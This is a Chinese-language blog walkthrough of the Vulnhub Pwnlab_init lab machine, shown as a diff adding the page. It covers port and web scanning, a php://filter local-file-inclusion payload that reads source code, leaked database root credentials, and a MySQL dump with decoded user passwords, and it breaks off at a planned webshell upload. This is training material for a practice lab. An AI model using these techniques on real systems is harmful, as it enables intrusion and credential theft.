@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Sh4Nn0n's Blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="Pwnlab_init至今为止遇到的比较头疼的靶机信息收集端口扫描123456789101112# Nmap 7.80 scan initiated Wed Feb 19 02:30:14 2020 as: nmap -Pn -sS -vv --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p- -oN /root/1.">
+<meta name="keywords" content="渗透测试,Vulnhub,OSCP,Pwnlab_init">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-Pwnlab_init-WalkThrough">
+<meta property="og:url" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/index.html">
+<meta property="og:site_name" content="Sh4Nn0n&#39;s Blog">
+<meta property="og:description" content="Pwnlab_init至今为止遇到的比较头疼的靶机信息收集端口扫描123456789101112# Nmap 7.80 scan initiated Wed Feb 19 02:30:14 2020 as: nmap -Pn -sS -vv --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p- -oN /root/1.">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/12.png">
+<meta property="og:updated_time" content="2020-03-06T02:09:06.902Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vulnhub-Pwnlab_init-WalkThrough">
+<meta name="twitter:description" content="Pwnlab_init至今为止遇到的比较头疼的靶机信息收集端口扫描123456789101112# Nmap 7.80 scan initiated Wed Feb 19 02:30:14 2020 as: nmap -Pn -sS -vv --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p- -oN /root/1.">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/1.png">
+  <link rel="canonical" href="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>vulnhub-Pwnlab_init-WalkThrough | Sh4Nn0n's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sh4Nn0n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">^.^</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sh4Nn0n">
+      <meta itemprop="description" content="^.^">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sh4Nn0n's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">vulnhub-Pwnlab_init-WalkThrough
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-06 10:05:45 / 修改时间：10:09:06" itemprop="dateCreated datePublished" datetime="2020-03-06T10:05:45+08:00">2020-03-06</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Vulnhub/" itemprop="url" rel="index"><span itemprop="name">Vulnhub</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Pwnlab-init"><a href="#Pwnlab-init" class="headerlink" title="Pwnlab_init"></a>Pwnlab_init</h1><hr><p>至今为止遇到的比较头疼的靶机</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Wed Feb 19 02:30:14 2020 as: nmap -Pn -sS -vv --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p- -oN /root/1.txt 192.168.208.147</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (192.168.208.147)</span><br><span class="line">Host is up, received arp-response (0.0028s latency).</span><br><span class="line">Scanned at 2020-02-19 02:30:14 EST <span class="keyword">for</span> 7s</span><br><span class="line"><span class="keyword">Not</span> shown: 65531 closed ports</span><br><span class="line">Reason: 65531 resets</span><br><span class="line">PORT      STATE<span class="built_in"> SERVICE </span>REASON</span><br><span class="line">80/tcp    open  http    syn-ack ttl 64</span><br><span class="line">111/tcp   open  rpcbind syn-ack ttl 64</span><br><span class="line">3306/tcp  open  mysql   syn-ack ttl 64</span><br><span class="line">36379/tcp open  unknown syn-ack ttl 64</span><br><span class="line">MAC Address: 00:0C:29:9A:6B:80 (VMware)</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Wed Feb 19 02:30:48 2020 as: nmap -nvv -Pn -sSV -p 80,111,3306,36379 --version-intensity 9 -A -oN /root/2.txt 192.168.208.147</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.208.147</span><br><span class="line">Host is up, received arp-response (0.00050s latency).</span><br><span class="line">Scanned at 2020-02-19 02:30:48 EST <span class="keyword">for</span> 13s</span><br><span class="line"></span><br><span class="line">PORT      STATE<span class="built_in"> SERVICE </span>REASON         VERSION</span><br><span class="line">80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: <span class="builtin-name">GET</span> HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: PwnLab Intranet Image Hosting</span><br><span class="line">111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          36379/tcp   status</span><br><span class="line">|   100024  1          51093/tcp6  status</span><br><span class="line">|   100024  1          55273/udp6  status</span><br><span class="line">|_  100024  1          59848/udp   status</span><br><span class="line">3306/tcp  open  mysql   syn-ack ttl 64 MySQL 5.5.47-0+deb8u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.47-0+deb8u1</span><br><span class="line">|   Thread ID: 38</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.50 ms 192.168.208.147</span><br></pre></td></tr></table></figure>
+
+<h3 id="web服务扫描"><a href="#web服务扫描" class="headerlink" title="web服务扫描"></a>web服务扫描</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nikto -h 192.168.208.147</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          192.168.208.147</span><br><span class="line">+ Target Hostname:    192.168.208.147</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ <span class="keyword">Start</span> <span class="built_in">Time</span>:         <span class="number">2020</span><span class="number">-02</span><span class="number">-20</span> <span class="number">00</span>:<span class="number">59</span>:<span class="number">54</span> (GMT<span class="number">-5</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: Apache/<span class="number">2.4</span><span class="number">.10</span> (Debian)</span><br><span class="line">+ The <span class="keyword">anti</span>-clickjacking X-Frame-Options header <span class="keyword">is</span> <span class="keyword">not</span> present.</span><br><span class="line">+ The X-XSS-<span class="keyword">Protection</span> header <span class="keyword">is</span> <span class="keyword">not</span> defined. This header can hint <span class="keyword">to</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> protect against <span class="keyword">some</span> forms <span class="keyword">of</span> XSS</span><br><span class="line">+ The X-<span class="keyword">Content</span>-<span class="keyword">Type</span>-Options header <span class="keyword">is</span> <span class="keyword">not</span> set. This could <span class="keyword">allow</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> render the <span class="keyword">content</span> <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span></span><br><span class="line">+ <span class="keyword">No</span> CGI Directories <span class="keyword">found</span> (<span class="keyword">use</span> <span class="string">'-C all'</span> <span class="keyword">to</span> <span class="keyword">force</span> <span class="keyword">check</span> <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ OSVDB<span class="number">-630</span>: The web <span class="keyword">server</span> may reveal its internal <span class="keyword">or</span> <span class="built_in">real</span> IP <span class="keyword">in</span> the Location header via a request <span class="keyword">to</span> /images <span class="keyword">over</span> <span class="keyword">HTTP</span>/<span class="number">1.0</span>. The <span class="keyword">value</span> <span class="keyword">is</span> <span class="string">"127.0.0.1"</span>.</span><br><span class="line">+ Apache/<span class="number">2.4</span><span class="number">.10</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> Apache/<span class="number">2.4</span><span class="number">.37</span>). Apache <span class="number">2.2</span><span class="number">.34</span> <span class="keyword">is</span> the EOL <span class="keyword">for</span> the <span class="number">2.</span>x branch.</span><br><span class="line">+ Web <span class="keyword">Server</span> <span class="keyword">returns</span> a valid response <span class="keyword">with</span> junk <span class="keyword">HTTP</span> methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ Cookie PHPSESSID created <span class="keyword">without</span> the httponly flag</span><br><span class="line">+ /config.php: PHP Config <span class="keyword">file</span> may contain <span class="keyword">database</span> IDs <span class="keyword">and</span> passwords.</span><br><span class="line">+ OSVDB<span class="number">-3268</span>: /images/: <span class="keyword">Directory</span> <span class="keyword">indexing</span> found.</span><br><span class="line">+ OSVDB<span class="number">-3233</span>: /icons/README: Apache <span class="keyword">default</span> <span class="keyword">file</span> found.</span><br><span class="line">+ /login.php: <span class="keyword">Admin</span> login page/<span class="keyword">section</span> found.</span><br><span class="line">+ <span class="number">7915</span> requests: <span class="number">0</span> <span class="keyword">error</span>(s) <span class="keyword">and</span> <span class="number">11</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="built_in">Time</span>:           <span class="number">2020</span><span class="number">-02</span><span class="number">-20</span> <span class="number">01</span>:<span class="number">00</span>:<span class="number">48</span> (GMT<span class="number">-5</span>) (<span class="number">54</span> <span class="keyword">seconds</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br></pre></td></tr></table></figure>
+
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>访问一下, 点一下login和upload</p>
+<p><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/1.png" alt><br><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/2.png" alt><br><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/3.png" alt><br>上传模块需要登录, 那登录考虑存在sql注入万能密码, 试一下,这里用sqlmap迅速试了一下发现不行, 说明不存在注入.<br>不过一个参数看起来挺有意思, 就是那个page参数.<br>试试能不能利用本地文件包含做点事情, 常规的尝试发现不行, 这里是我没接触过得一个知识点:<br><a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/" target="_blank" rel="noopener">interesting-local-file-inclusion-method</a></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">208.147</span><span class="regexp">/?page=php:/</span><span class="regexp">/filter/</span>convert.base64-encode<span class="regexp">/resource=index</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/4.png" alt><br>读出了东西, 应该是源代码, 我们解密一下, base64.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//Multilingual. Not implemented yet.</span></span></span><br><span class="line"><span class="php"><span class="comment">//setcookie("lang","en.lang.php");</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lang'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">include</span>(<span class="string">"lang/"</span>.$_COOKIE[<span class="string">'lang'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Not implemented yet.</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>PwnLab Intranet Image Hosting<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/pwnlab.png"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">[ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ] [ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=login"</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ] [ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=upload"</span>&gt;</span>Upload<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ]</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))</span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">include</span>($_GET[<span class="string">'page'</span>].<span class="string">".php"</span>);</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span></span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">"Use this server to upload and share image files inside the intranet"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>bingo,看一下源码, 注意到一个有意思的地方, 如果cookie值为’lang’,会include到一个文件里. 猜测后面会用到</p>
+<p>看nikto的扫描结果, 说config.php源代码里面有数据库的账号密码, 那我们读取一下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$server	  = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"H4u%QJ_H99"</span>;</span></span><br><span class="line"><span class="php">$database = <span class="string">"Users"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>果然有, 连接一下看看</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# mysql -u root -p -h 192.168.208.147</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 316</span><br><span class="line">Server version: 5.5.47-0+deb8u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="emphasis">'help;'</span> or <span class="emphasis">'\h'</span> for help. Type <span class="emphasis">'\c'</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line"><span class="code">+--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line"><span class="code">+--------------------+</span></span><br><span class="line">| information<span class="emphasis">_schema |</span></span><br><span class="line"><span class="emphasis">| Users              |</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">MySQL [(none)]&gt; use Users;</span></span><br><span class="line"><span class="emphasis">Reading table information for completion of table and column names</span></span><br><span class="line"><span class="emphasis">You can turn off this feature to get a quicker startup with -A</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">Database changed</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">MySQL [Users]&gt; show tables;</span></span><br><span class="line"><span class="emphasis">+-----------------+</span></span><br><span class="line"><span class="emphasis">| Tables_</span>in<span class="emphasis">_Users |</span></span><br><span class="line"><span class="emphasis">+-----------------+</span></span><br><span class="line"><span class="emphasis">| users           |</span></span><br><span class="line"><span class="emphasis">+-----------------+</span></span><br><span class="line"><span class="emphasis">1 row in set (0.000 sec)</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">MySQL [Users]&gt; select * from users</span></span><br><span class="line"><span class="emphasis">    -&gt; ;</span></span><br><span class="line"><span class="emphasis">+------+------------------+</span></span><br><span class="line"><span class="emphasis">| user | pass             |</span></span><br><span class="line"><span class="emphasis">+------+------------------+</span></span><br><span class="line"><span class="emphasis">| kent | Sld6WHVCSkpOeQ== |</span></span><br><span class="line"><span class="emphasis">| mike | U0lmZHNURW42SQ== |</span></span><br><span class="line"><span class="emphasis">| kane | aVN2NVltMkdSbw== |</span></span><br><span class="line"><span class="emphasis">+------+------------------+</span></span><br><span class="line"><span class="emphasis">3 rows in set (0.000 sec)</span></span><br></pre></td></tr></table></figure>
+
+<p>解密一下:<br>| user | pass  |<br>| — | — |<br>| kent | JWzXuBJJNy |<br>| mike | SIfdsTEn6I |<br>| kane | iSv5Ym2GRo |</p>
+<p>尝试传webshell, 这里看一下上传处的源码</p>
